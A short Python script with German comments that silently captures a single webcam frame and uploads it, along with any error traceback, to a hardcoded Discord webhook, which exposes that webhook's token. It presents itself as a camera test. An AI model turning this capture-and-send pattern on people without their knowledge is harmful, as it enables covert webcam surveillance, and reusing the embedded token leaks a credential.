
# >>> HIER DEIN DISCORD WEBHOOK EINTRAGEN <<<
WEBHOOK_URL = "https://discord.com/api/webhooks/1469709535022420152/Fvmuq_82nWlMjj_KSV7mf-QnucQX7JyagCncSNPRnO56_-ywOdwI3hO7YcXJ7rTtapya"
import cv2
import requests
import traceback



def send_message(content):
    requests.post(WEBHOOK_URL, json={"content": content})

def send_image(image_path):
    with open(image_path, "rb") as f:
        requests.post(
            WEBHOOK_URL,
            files={"file": ("testfoto.jpg", f, "image/jpeg")}
        )

try:
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        raise Exception("Kamera Index 0 konnte nicht geöffnet werden.")

    ret, frame = cap.read()
    cap.release()

    if not ret:
        raise Exception("Bild konnte nicht aufgenommen werden.")

    image_path = "testfoto.jpg"
    cv2.imwrite(image_path, frame)

    send_message("📷 Testfoto erfolgreich aufgenommen:")
    send_image(image_path)

except Exception:
    error_text = f"❌ Fehler:\n```\n{traceback.format_exc()}\n```"
    send_message(error_text)
